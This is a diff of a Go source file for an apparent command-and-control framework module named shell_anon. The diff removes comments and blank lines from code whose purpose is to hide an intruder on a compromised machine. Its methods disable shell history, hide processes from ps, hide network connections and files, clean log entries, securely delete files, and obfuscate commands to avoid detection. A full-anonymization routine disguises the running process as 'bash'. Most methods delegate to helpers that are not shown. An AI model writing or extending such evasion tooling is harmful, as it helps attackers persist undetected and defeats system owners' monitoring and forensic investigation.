@@ -1,14 +1,10 @@
 package shell_anon
-
 import (
 	"fmt"
 	"os"
 	"runtime"
-
 	"github.com/simplified_c2/module"
 )
-
-// Module represents the shell anonymization module
 type Module struct {
 	Name          string
 	Version       string
@@ -20,8 +16,6 @@ type Module struct {
 	networkHider  *NetworkHider
 	cmdObfuscator *CommandObfuscator
 }
-
-// NewModule creates a new shell anonymization module
 func NewModule() *Module {
 	return &Module{
 		Name:          "shell_anon",
@@ -35,8 +29,6 @@ func NewModule() *Module {
 		cmdObfuscator: NewCommandObfuscator(),
 	}
 }
-
-// GetInfo returns information about the module
 func (m *Module) GetInfo() *module.ModuleInfo {
 	return &module.ModuleInfo{
 		Name:        m.Name,
@@ -118,13 +110,9 @@ func (m *Module) GetInfo() *module.ModuleInfo {
 		},
 	}
 }
-
-// Initialize initializes the module
 func (m *Module) Initialize() error {
 	return nil
 }
-
-// ExecuteCommand executes a command
 func (m *Module) ExecuteCommand(command string, args []string) (interface{}, error) {
 	switch command {
 	case "setup":
@@ -219,14 +207,14 @@ func (m *Module) ExecuteCommand(command string, args []string) (interface{}, err
 	case "status":
 		status := make(map[string]interface{})
 		
-		// Check history status
+		
 		histFile := os.Getenv("HISTFILE")
 		status["history_disabled"] = (histFile == "/dev/null" || histFile == "")
 		
-		// Check process hiding
+		
 		status["process_hiding_supported"] = (runtime.GOOS == "linux")
 		
-		// Check temporary directory
+		
 		tmpDir := os.Getenv("TMPDIR")
 		status["secure_tmpdir"] = (tmpDir == "/dev/shm")
 		
@@ -236,117 +224,83 @@ func (m *Module) ExecuteCommand(command string, args []string) (interface{}, err
 		return nil, fmt.Errorf("unknown command: %s", command)
 	}
 }
-
-// SetupHackShell sets up a complete "hack shell" environment
 func (m *Module) SetupHackShell() error {
 	return m.anonymizer.SetupHackShell()
 }
-
-// GenerateHackShellScript generates a script to set up a hack shell
 func (m *Module) GenerateHackShellScript(outputPath string) error {
 	script := m.anonymizer.GenerateHackShellScript()
 	return os.WriteFile(outputPath, []byte(script), 0755)
 }
-
-// DisableHistory disables command history
 func (m *Module) DisableHistory() error {
 	return m.anonymizer.DisableHistory()
 }
-
-// RestoreHistory restores the original history settings
 func (m *Module) RestoreHistory() error {
 	return m.anonymizer.RestoreHistory()
 }
-
-// HideProcess hides a process from monitoring tools
 func (m *Module) HideProcess(pid int, newName string) error {
 	return m.processHider.HideProcess(pid, newName)
 }
-
-// HideCurrentProcess hides the current process
 func (m *Module) HideCurrentProcess(newName string) error {
 	return m.processHider.HideCurrentProcess(newName)
 }
-
-// HideFromPS hides a process from ps command output
 func (m *Module) HideFromPS() error {
 	return m.processHider.HideFromPS()
 }
-
-// HideConnection hides a network connection
 func (m *Module) HideConnection(port int) error {
 	return m.networkHider.HideConnection(port)
 }
-
-// ObfuscateNetworkTraffic obfuscates network traffic
 func (m *Module) ObfuscateNetworkTraffic(data []byte) []byte {
 	return m.networkHider.ObfuscateNetworkTraffic(data)
 }
-
-// DeobfuscateNetworkTraffic deobfuscates network traffic
 func (m *Module) DeobfuscateNetworkTraffic(obfuscated []byte) []byte {
 	return m.networkHider.DeobfuscateNetworkTraffic(obfuscated)
 }
-
-// HideFile hides a file from ls command
 func (m *Module) HideFile(path string) error {
 	return m.fileHider.HideFile(path)
 }
-
-// CleanLogFile removes entries from a log file
 func (m *Module) CleanLogFile(logPath string, pattern string) error {
 	return m.fileHider.CleanLogFile(logPath, pattern)
 }
-
-// SecureDelete securely deletes a file
 func (m *Module) SecureDelete(path string) error {
 	return m.fileHider.SecureDelete(path)
 }
-
-// ObfuscateCommand obfuscates a command to avoid detection
 func (m *Module) ObfuscateCommand(command string) string {
 	return m.cmdObfuscator.ObfuscateCommand(command)
 }
-
-// EncodeCommand encodes a command using base64
 func (m *Module) EncodeCommand(command string) string {
 	return m.cmdObfuscator.EncodeCommand(command)
 }
-
-// GetAnonymizationStatus returns the current anonymization status
 func (m *Module) GetAnonymizationStatus() map[string]interface{} {
 	status := make(map[string]interface{})
 	
-	// Check history status
+	
 	histFile := os.Getenv("HISTFILE")
 	status["history_disabled"] = (histFile == "/dev/null" || histFile == "")
 	
-	// Check process hiding
+	
 	status["process_hiding_supported"] = (runtime.GOOS == "linux")
 	
-	// Check temporary directory
+	
 	tmpDir := os.Getenv("TMPDIR")
 	status["secure_tmpdir"] = (tmpDir == "/dev/shm")
 	
 	return status
 }
-
-// ApplyFullAnonymization applies all anonymization techniques
 func (m *Module) ApplyFullAnonymization() error {
-	// Setup hack shell
+	
 	if err := m.SetupHackShell(); err != nil {
 		return fmt.Errorf("failed to setup hack shell: %v", err)
 	}
 	
-	// Hide current process if supported
+	
 	if runtime.GOOS == "linux" {
 		if err := m.HideCurrentProcess("bash"); err != nil {
-			// Non-critical error, just log it
+			
 			fmt.Printf("Warning: failed to hide current process: %v\n", err)
 		}
 		
 		if err := m.HideFromPS(); err != nil {
-			// Non-critical error, just log it
+			
 			fmt.Printf("Warning: failed to hide from ps: %v\n", err)
 		}
 	}
